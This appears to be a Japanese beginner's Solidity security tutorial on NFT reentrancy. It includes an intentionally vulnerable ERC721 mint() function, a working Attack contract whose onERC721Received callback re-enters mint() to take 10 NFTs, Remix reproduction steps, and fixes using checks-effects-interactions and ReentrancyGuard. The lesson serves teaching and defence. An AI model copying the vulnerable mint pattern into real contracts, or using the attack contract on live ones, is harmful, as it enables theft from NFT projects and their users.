---
title: S16. NFTリエントランシー攻撃
tags:
  - solidity
  - security
  - fallback
  - nft
  - erc721
  - erc1155
---

# WTF Solidity 合約セキュリティ: S16. NFTリエントランシー攻撃

最近、Solidityを再学習し、詳細を固めるために「WTF Solidity 合約セキュリティ」を書いています。初心者向けのチュートリアル（プログラミング上級者は他のチュートリアルを参照してください）で、毎週1-3レッスンを更新します。

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science)｜[@WTFAcademy_](https://twitter.com/WTFAcademy_)

コミュニティ: [Discord](https://discord.gg/5akcruXrsk)｜[微信群](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[公式サイト wtf.academy](https://wtf.academy)

すべてのコードとチュートリアルはgithubで公開: [github.com/AmazingAng/WTF-Solidity](https://github.com/AmazingAng/WTF-Solidity)

---

このレッスンでは、NFTコントラクトのリエントランシー攻撃脆弱性について紹介し、脆弱性のあるNFTコントラクトを攻撃して10個のNFTを鋳造します。

## NFTリエントランシーのリスク

[S01 リエントランシー攻撃](https://github.com/AmazingAng/WTF-Solidity/blob/main/S01_ReentrancyAttack/readme.md)で説明したように、リエントランシー攻撃はスマートコントラクトで最も一般的な攻撃の一つです。攻撃者はコントラクトの脆弱性（例：`fallback`関数）を通じてコントラクトを循環呼び出しし、コントラクト内の資産を転送したり、大量のトークンを鋳造したりします。NFTの転送時にはコントラクトの`fallback`や`receive`関数がトリガーされないのに、なぜリエントランシーのリスクがあるのでしょうか？

これは、NFT標準（[ERC721](https://github.com/AmazingAng/WTF-Solidity/blob/main/34_ERC721/readme.md)/[ERC1155](https://github.com/AmazingAng/WTF-Solidity/blob/main/40_ERC1155/readme.md)）がユーザーが誤って資産をブラックホールに転送することを防ぐため、安全転送を追加したためです：転送先アドレスがコントラクトの場合、そのアドレスの対応するチェック関数を呼び出し、NFT資産を受け取る準備ができていることを確認します。例えば、`ERC721`の`safeTransferFrom()`関数は対象アドレスの`onERC721Received()`関数を呼び出し、ハッカーはその中に悪意のあるコードを埋め込んで攻撃することができます。

`ERC721`と`ERC1155`でリエントランシーリスクの可能性がある関数をまとめました：

![](./img/S16-1.png)

## 脆弱性の例

以下で、リエントランシー脆弱性のあるNFTコントラクトの例を学習します。これは`ERC721`コントラクトで、各アドレスが無料で1つのNFTを鋳造できますが、リエントランシー攻撃により一度に複数を鋳造できます。

### 脆弱性コントラクト

`NFTReentrancy`コントラクトは`ERC721`コントラクトを継承し、主に2つの状態変数があります。`totalSupply`はNFTの総供給量を記録し、`mintedAddress`は既に鋳造したアドレスを記録して、ユーザーが複数回鋳造することを防ぎます。主に2つの関数があります：
- コンストラクタ：`ERC721` NFTの名前とシンボルを初期化します。
- `mint()`：鋳造関数、各ユーザーが無料で1つのNFTを鋳造できます。**注意：この関数にはリエントランシー脆弱性があります！**

```solidity
contract NFTReentrancy is ERC721 {
    uint256 public totalSupply;
    mapping(address => bool) public mintedAddress;
    // コンストラクタ、NFTコレクションの名前、シンボルを初期化
    constructor() ERC721("Reentry NFT", "ReNFT"){}

    // 鋳造関数、各ユーザーは1つのNFTのみ鋳造可能
    // リエントランシー脆弱性あり
    function mint() payable external {
        // mint済みかどうかをチェック
        require(mintedAddress[msg.sender] == false);
        // total supplyを増加
        totalSupply++;
        // mint
        _safeMint(msg.sender, totalSupply);
        // mint済みアドレスを記録
        mintedAddress[msg.sender] = true;
    }
}
```

### 攻撃コントラクト

`NFTReentrancy`コントラクトのリエントランシー攻撃ポイントは、`mint()`関数が`ERC721`コントラクトの`_safeMint()`を呼び出し、それが転送先アドレスの`_checkOnERC721Received()`関数を呼び出すことです。転送先アドレスの`_checkOnERC721Received()`に悪意のあるコードが含まれている場合、攻撃が可能です。

`Attack`コントラクトは`IERC721Receiver`コントラクトを継承し、脆弱性のあるNFTコントラクトアドレスを記録する1つの状態変数`nft`があります。3つの関数があります：
- コンストラクタ：脆弱性のあるNFTコントラクトアドレスを初期化します。
- `attack()`：攻撃関数、NFTコントラクトの`mint()`関数を呼び出して攻撃を開始します。
- `onERC721Received()`：悪意のあるコードが埋め込まれたERC721コールバック関数で、`mint()`関数を繰り返し呼び出し、10個のNFTを鋳造します。

```solidity
contract Attack is IERC721Receiver{
    NFTReentrancy public nft; // 脆弱性のあるnftコントラクトアドレス

    // NFTコントラクトアドレスを初期化
    constructor(NFTReentrancy _nftAddr) {
        nft = _nftAddr;
    }

    // 攻撃関数、攻撃を開始
    function attack() external {
        nft.mint();
    }

    // ERC721のコールバック関数、mint関数を繰り返し呼び出し、10個を鋳造
    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        if(nft.balanceOf(address(this)) < 10){
            nft.mint();
        }
        return this.onERC721Received.selector;
    }
}
```

## Remixでの再現

1. `NFTReentrancy`コントラクトをデプロイします。
2. `Attack`コントラクトをデプロイし、パラメータに`NFTReentrancy`コントラクトアドレスを入力します。
3. `Attack`コントラクトの`attack()`関数を呼び出して攻撃を開始します。
4. `NFTReentrancy`コントラクトの`balanceOf()`関数を呼び出して`Attack`コントラクトの保有量を照会すると、`10`個のNFTを保有していることが確認でき、攻撃が成功します。

![](./img/S16-2.png)

## 予防方法

リエントランシー攻撃脆弱性を予防する主な方法は2つあります：チェック-エフェクト-インタラクションパターン（checks-effect-interaction）とリエントランシーロック。

1. チェック-エフェクト-インタラクションパターン：関数を書く際に、まず状態変数が要件を満たしているかチェックし、続いて状態変数（例：残高）を更新し、最後に他のコントラクトとやり取りすることを強調します。このパターンを使って脆弱性のある`mint()`関数を修正できます：

  ```solidity
      function mint() payable external {
          // mint済みかどうかをチェック
          require(mintedAddress[msg.sender] == false);
          // total supplyを増加
          totalSupply++;
          // mint済みアドレスを記録
          mintedAddress[msg.sender] = true;
          // mint
          _safeMint(msg.sender, totalSupply);
      }
  ```

2. リエントランシーロック：リエントランシー関数を防ぐ修飾子（modifier）です。OpenZeppelinが提供する[ReentrancyGuard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)を直接使用することを推奨します。

## まとめ

このレッスンでは、NFTのリエントランシー攻撃脆弱性について紹介し、脆弱性のあるNFTコントラクトを攻撃して10個のNFTを鋳造しました。現在、リエントランシー攻撃を予防する主な方法は2つあります：チェック-エフェクト-インタラクションパターン（checks-effect-interaction）とリエントランシーロックです。